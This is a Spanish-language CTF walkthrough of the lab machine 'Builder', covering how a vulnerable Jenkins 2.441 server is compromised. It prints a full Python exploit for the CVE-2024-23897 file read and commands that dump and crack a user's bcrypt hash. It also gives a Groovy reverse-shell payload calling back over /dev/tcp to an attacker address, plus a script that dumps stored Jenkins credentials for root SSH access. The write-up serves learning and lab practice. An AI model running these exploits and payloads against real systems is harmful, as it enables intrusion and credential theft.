# Builder

![](../../../../~gitbook/image.md)Publicado: 06 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Medium
###📝 Descripción
Builder es una máquina Linux de dificultad media que aloja un servidor Jenkins vulnerable. La máquina presenta una vulnerabilidad de lectura de archivos locales (LFI) en Jenkins a través del CVE-2024-23897, que permite acceder a archivos del sistema sin autenticación. Esta vulnerabilidad surge por el uso de la librería args4j en el CLI de Jenkins, donde argumentos que comienzan con `@` seguidos de una ruta de archivo son interpretados automáticamente como contenido del archivo.El proceso de explotación incluye el uso de esta vulnerabilidad para extraer archivos de configuración de Jenkins, específicamente archivos XML que contienen hashes de contraseñas de usuarios. Una vez obtenidas las credenciales mediante fuerza bruta, se aprovecha la consola de scripts de Jenkins (Groovy) para ejecutar código arbitrario y obtener una shell reversa. Finalmente, se descubren credenciales SSH almacenadas en el sistema Jenkins para escalar privilegios al usuario root.Categorías: 🔐 Credential Harvesting, 🌐 Web Exploitation, 🐳 Container Escape, 🔑 SSH Key Extraction, 💻 Jenkins Security
###🔭 Reconocimiento

####Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
####Escaneo de puertos

####Enumeración de servicios

###🌐 Enumeración Web

####🏗️ Puerto 8080 HTTP (Jenkins 2.441)
Accedemos al puerto 8080 y descubrimos un servicio Jenkins. A priori no podemos enumerar gran cosa salvo un usuario llamado jennifer y la versión de este servicio que es la 2.441 que es conocida por presentar una vulnerabilidad de tipo Local File Inclusion.![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Y un panel de login en el que las credenciales por defecto no parecen funcionar.![](../../../../~gitbook/image.md)
####CVE-2024-23897
¿Qué es CVE‑2024‑23897?- Afecta a Jenkins Core (antes de la versión 2.442) y Jenkins LTS (antes de la versión 2.426.3). [nvd.nist.gov](https://nvd.nist.gov/vuln/detail/CVE-2024-23897?utm_source=chatgpt.com)[jenkins.io](https://www.jenkins.io/security/advisory/2024-01-24/?utm_source=chatgpt.com)
- Se origina por una característica de la librería args4j utilizada en el CLI: cuando un argumento comienza con `@` seguido de un camino de archivo, Jenkins reemplaza automáticamente esa sintaxis por el contenido del archivo — incluso si no estás autenticado.

####🔓 Cómo se explota
- El atacante descarga `jenkins-cli.jar` del servidor Jenkins.
- Usa `@/ruta/al/archivo` como argumento en un comando CLI, provocando que el contenido del archivo se revele. [blog.certcube.com](https://blog.certcube.com/cve-2024-23897-jenkins-arbitrary-file-read-vulnerability/?utm_source=chatgpt.com)[github.com](https://github.com/verylazytech/CVE-2024-23897?utm_source=chatgpt.com)
- Con los secretos obtenidos, podrían escalar a RCE usando los vectores mencionados arriba.
En este caso decido usar un script en python en lugar de usar jenkins-cli.jar aunque en caso de optar por la primera opción el comando a utilizar sería algo como esto:🐍 Exploit en PythonConfirmamos la vulnerabilidad LFI leyendo el archivo /etc/passwd del sistema![](../../../../~gitbook/image.md)Vemos que hay un usuario llamado jenkins en el sistema. Buscando información sobre donde guarda Jenkins las credenciales de usuario, vemos que existe un archivo initialAdminPassword que debería ubicarse en `/var/jenkins_home/secrets/initialAdminPassword` pero en este caso no obtenemos resultado:![](../../../../~gitbook/image.md)Sin embargo, buscando y leyendo documentación sobre configuración de jenkins https://dev.to/pencillr/spawn-a-jenkins-from-code-gfa?source=post_page-----143ad7fde347---------------------------------------encontramos que hay algunos otros ficheros como config.xml y users.xml que pueden ser de utilidad:📁 /var/jenkins_home/users/users.xml📁 /var/jenkins_home/config.xmlLo interesante de esta información está en la clave `jennifer_12108429903186576833`. Podemos usarla para continuar enumerando la información específica de este usuario:📁 /var/jenkins_home/users/jennifer_12108429903186576833/config.xml
####🔓 Cracking del Hash
Encontramos el hash de tipo bcrypt usuario jennifer:![](../../../../~gitbook/image.md)Usamos hashcat y el diccionario rockyou para crackear este hash y obtener la contraseña:![](../../../../~gitbook/image.md)
####🚀 Acceso Inicial
Volvemos ahora al panel de login Jenkins y nos autenticamos como jennifer:![](../../../../~gitbook/image.md)Una vez dentro, como jennifer es admin ahora tenemos habilitadas todas las opciones del árbol de la izquierda, entre ellas está la función script console:![](../../../../~gitbook/image.md)Esta consola permite a un usuario ejecutar Apache [Groovy](https://en.wikipedia.org/wiki/Apache_Groovy) scripts, que son un lenguaje compatible con Java orientado a objetos. El lenguaje es similar a Python y Ruby. El código fuente de Groovy se compila en Java Bytecode y puede ejecutarse en cualquier plataforma que tenga JRE instalado.Usando esta consola de scripts, es posible ejecutar comandos arbitrarios, funcionando de manera similar a un shell web. Por ejemplo, podemos usar el siguiente fragmento para ejecutar el `id` comando.![](../../../../~gitbook/image.md)Vemos que funcione y nos devuelve como el resultado del id del usuario jenkins.Ahora veamos cómo podemos aprovechar esto para ganar acceso a la máquina. Podemos cambiar el payload anterior por:Iniciamos un listener con netcat:Ejecutar los comandos anteriores da como resultado una conexión de shell inversa.![](../../../../~gitbook/image.md)
####🛠️ Mejora de la TTY

####🐳 Análisis del Entorno
Al tratar de enumerar usuarios en el directorio /home vemos que no hay nada. ¿Será que estamos dentro de un contenedor?Tal como sospechaba, estamos dentro de un contenedor tal como podemos confirmar viendo el fichero .dockerenv en la raíz del sistema:La flag user.txt la encontramos en el directorio `/var/jenkins_home`![](../../../../~gitbook/image.md)
####🔑 Escalada de Privilegios
Justo en el mismo directorio donde se ubica de la primera flag, vemos unos archivos con nombres que invitan a ver qué son llamados secret.key, secret.key.not-so-secret y secrets:Parece una clave ssh, pero no en el formato que se usa habitualmente sino que parece estar en hexadecimal. Quizás si logramos obtener una llave ssh podemos escapar del contenedor y lograr una escalada de privilegios.![](../../../../~gitbook/image.md)Investigando sobre esto descubrimos un repositorio con utilidades de jenkins:
https://github.com/tarvitz/jenkins-utils![](../../../../~gitbook/image.md)Hay un script que podemos usar en la utilidad /script de nuestro jenkins para extraer los secrets de jenkins master siempre que seamos administradores. Como en este caso lo somos, basta con ejecutarlo y obtenemos la clave:![](../../../../~gitbook/image.md)Copiamos la clave privada y la copiamos en un fichero en nuestro host de ataque y le damos permisos 600. Finalmente nos conectamos y ganamos acceso como root:Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)

```
❯   ping -c2 10.10.11.10
PING 10.10.11.10 (10.10.11.10) 56(84) bytes of data.
64 bytes from 10.10.11.10: icmp_seq=1 ttl=63 time=49.3 ms
64 bytes from 10.10.11.10: icmp_seq=2 ttl=63 time=47.5 ms

--- 10.10.11.10 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1000ms
rtt min/avg/max/mdev = 47.504/48.382/49.261/0.878 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.10 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
22,8080
```

```
nmap -sC -sV -p$ports 10.10.11.10 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 13:46 CEST
Nmap scan report for 10.10.11.10
Host is up (1.6s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
8080/tcp open  http    Jetty 10.0.18
|_http-title: Dashboard [Jenkins]
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(10.0.18)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
java -jar jenkins-cli.jar -s http://10.10.11.10:8080/ -http connect-node "@/etc/passwd"
```

```
# Exploit Title: Jenkins 2.441 - Local File Inclusion
# Date: 14/04/2024
# Exploit Author: Matisse Beckandt (Backendt)
# Vendor Homepage: https://www.jenkins.io/
# Software Link: https://github.com/jenkinsci/jenkins/archive/refs/tags/jenkins-2.441.zip
# Version: 2.441
# Tested on: Debian 12 (Bookworm)
# CVE: CVE-2024-23897

from argparse import ArgumentParser
from requests import Session, post, exceptions
from threading import Thread
from uuid import uuid4
from time import sleep
from re import findall

class Exploit(Thread):
def __init__(self, url: str, identifier: str):
Thread.__init__(self)
self.daemon = True
self.url = url
self.params = {"remoting": "false"}
self.identifier = identifier
self.stop_thread = False
self.listen = False

def run(self):
while not self.stop_thread:
if self.listen:
self.listen_and_print()

def stop(self):
self.stop_thread = True

def receive_next_message(self):
self.listen = True

def wait_for_message(self):
while self.listen:
sleep(0.5)

def print_formatted_output(self, output: str):
if "ERROR: No such file" in output:
print("File not found.")
elif "ERROR: Failed to parse" in output:
print("Could not read file.")

expression = "No such agent \"(.*)\" exists."
results = findall(expression, output)
print("\n".join(results))

def listen_and_print(self):
session = Session()
headers = {"Side": "download", "Session": self.identifier}
try:
response = session.post(self.url, params=self.params, headers=headers)
except (exceptions.ConnectTimeout, exceptions.ConnectionError):
print("Could not connect to target to setup the listener.")
exit(1)

self.print_formatted_output(response.text)
self.listen = False

def send_file_request(self, filepath: str):
headers = {"Side": "upload", "Session": self.identifier}
payload = get_payload(filepath)
try:
post(self.url, data=payload, params=self.params, headers=headers, timeout=4)
except (exceptions.ConnectTimeout, exceptions.ConnectionError):
print("Could not connect to the target to send the request.")
exit(1)

def read_file(self, filepath: str):
self.receive_next_message()
sleep(0.1)
self.send_file_request(filepath)
self.wait_for_message()

def get_payload_message(operation_index: int, text: str) -> bytes:
text_bytes = bytes(text, "utf-8")
text_size = len(text_bytes)
text_message = text_size.to_bytes(2) + text_bytes
message_size = len(text_message)

payload = message_size.to_bytes(4) + operation_index.to_bytes(1) + text_message
return payload

def get_payload(filepath: str) -> bytes:
arg_operation = 0
start_operation = 3

command = get_payload_message(arg_operation, "connect-node")
poisoned_argument = get_payload_message(arg_operation, f"@{filepath}")

payload = command + poisoned_argument + start_operation.to_bytes(1)
return payload

def start_interactive_file_read(exploit: Exploit):
print("Press Ctrl+C to exit")
while True:
filepath = input("File to download:\n> ")
filepath = make_path_absolute(filepath)
exploit.receive_next_message()

try:
exploit.read_file(filepath)
except exceptions.ReadTimeout:
print("Payload request timed out.")

def make_path_absolute(filepath: str) -> str:
if not filepath.startswith('/'):
return f"/proc/self/cwd/{filepath}"
return filepath

def format_target_url(url: str) -> str:
if url.endswith('/'):
url = url[:-1]
return f"{url}/cli"

def get_arguments():
parser = ArgumentParser(description="Local File Inclusion exploit for CVE-2024-23897")
parser.add_argument("-u", "--url", required=True, help="The url of the vulnerable Jenkins service. Ex: http://helloworld.com/")
parser.add_argument("-p", "--path", help="The absolute path of the file to download")
return parser.parse_args()

def main():
args = get_arguments()
url = format_target_url(args.url)
filepath = args.path
identifier = str(uuid4())

exploit = Exploit(url, identifier)
exploit.start()

if filepath:
filepath = make_path_absolute(filepath)
exploit.read_file(filepath)
exploit.stop()
return

try:
start_interactive_file_read(exploit)
except KeyboardInterrupt:
pass
print("\nQuitting")
exploit.stop()

if __name__ == "__main__":
main()

```

```
python3 lfi_jenkins.py -u http://10.10.11.10:8080
```

```

jennifer_12108429903186576833

jennifer
1

```

```
all

false

false

2
true

false
${JENKINS_HOME}/workspace/${ITEM_FULL_NAME}
false
0

all

50000
true
${ITEM_ROOTDIR}/builds

2.441

false
false
false

NORMAL
```

```

authenticated

all

jennifer@builder.htb

false

1707318554385

true

default

jennifer
6841d11dc1de101d
jennifer
10

false

#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a
```

```
$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a
```

```
nth --text '$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a'
```

```
hashcat -a 0 -m 3200 '$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a'  /usr/share/wordlists/rockyou.txt
```

```
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.4/443;cat &5 >&5; done"] as String[])
p.waitFor()
```

```
nc -nlvp 443
```

```
/bin/bash -i
script /dev/null -c bash
Ctrl + Z (suspended)

stty raw -echo; fg
reset xterm
export TERM=xterm
stty rows x columns x

```

```
jenkins@0f52c222a4cc:/$ cd /home && ls -la
total 8
drwxr-xr-x 2 root root 4096 Dec  9  2023 .
drwxr-xr-x 1 root root 4096 Feb  7  2024 ..
```

```
jenkins@0f52c222a4cc:/$ ls -la
total 56
drwxr-xr-x   1 root root 4096 Feb  7  2024 .
drwxr-xr-x   1 root root 4096 Feb  7  2024 ..
-rwxr-xr-x   1 root root    0 Feb  7  2024 .dockerenv
lrwxrwxrwx   1 root root    7 Jan 10  2024 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Dec  9  2023 boot
drwxr-xr-x   5 root root  340 Jun  6 11:52 dev
drwxr-xr-x   1 root root 4096 Feb  7  2024 etc
drwxr-xr-x   2 root root 4096 Dec  9  2023 home
lrwxrwxrwx   1 root root    7 Jan 10  2024 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Jan 10  2024 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Jan 10  2024 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Jan 10  2024 libx32 -> usr/libx32
drwxr-xr-x   2 root root 4096 Jan 10  2024 media
drwxr-xr-x   2 root root 4096 Jan 10  2024 mnt
drwxr-xr-x   1 root root 4096 Jan 16  2024 opt
dr-xr-xr-x 276 root root    0 Jun  6 11:52 proc
drwx------   1 root root 4096 Jan 16  2024 root
drwxr-xr-x   1 root root 4096 Jan 16  2024 run
lrwxrwxrwx   1 root root    8 Jan 10  2024 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Jan 10  2024 srv
dr-xr-xr-x  13 root root    0 Jun  6 11:52 sys
drwxrwxrwt   1 root root 4096 Jun  6 11:52 tmp
drwxr-xr-x   1 root root 4096 Jan 10  2024 usr
drwxr-xr-x   1 root root 4096 Jan 16  2024 var
```

```
com.cloudbees.plugins.credentials.SystemCredentialsProvider.getInstance().getCredentials().forEach{
it.properties.each { prop, val ->
println(prop + ' = "' + val + '"')
}
println("-----------------------")
}
```

```
chmod 600 id_rsa
ssh -i id_rsa root@10.10.11.10
```

```
Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Feb 12 13:15:44 2024 from 10.10.14.40
root@builder:~# whoami
root
root@builder:~# id
uid=0(root) gid=0(root) groups=0(root)
root@builder:~# ls -la /root
total 32
drwx------  5 root root 4096 Jun  6 11:52 .
drwxr-xr-x 18 root root 4096 Feb  9  2024 ..
lrwxrwxrwx  1 root root    9 Apr 27  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Apr 27  2023 .cache
drwxr-xr-x  3 root root 4096 Apr 27  2023 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 Jun  6 11:52 root.txt
drwx------  2 root root 4096 Feb  8  2024 .ssh
root@builder:~#
```
